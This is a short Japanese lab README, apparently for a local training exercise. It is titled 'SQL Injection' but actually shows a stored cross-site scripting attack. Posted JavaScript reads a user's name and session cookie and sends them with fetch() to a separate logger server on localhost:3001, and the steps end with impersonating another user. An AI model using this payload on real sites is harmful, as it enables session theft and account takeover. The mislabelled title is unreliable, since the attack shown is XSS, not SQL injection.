# SQL Injection

# Environment

Debian 11

# Get Started

1つのターミナル上で対象サーバーを建てる

```bash
bash init.sh
php -S localhost:3000
```

別のターミナル上で攻撃用サーバーを建てる

```bash
php -S localhost:3001
```


# Exploit

1. user01でログイン

ブラウザでlocalhost:3000/login.phpにアクセスする

user01としてログインする (`user01` / `user01`)

2. コードを挿入

次のようなコードを投稿する

```javascript
Hello
<script>
var url = 'http://localhost:3001/logger.php';
var user = encodeURIComponent(document.querySelector('#username').innerText);
var cookie = encodeURIComponent(document.cookie);
fetch(`${url}?user=${user}&cookie=${cookie}`, { mode: "no-cors" })
</script>
```

3. 疎通確認
localhost:3000/index.php に再度アクセスすると localhost:3001 側のサーバー にcookie情報のログが出力されることを確認する

4. user02でログインする (`user02` / `user02`)

5. ログ確認
localhost:3001 側のサーバー にcookie情報のログが出力されることを確認する

cookieが手に入ったのでuser01になりすましてログインできる

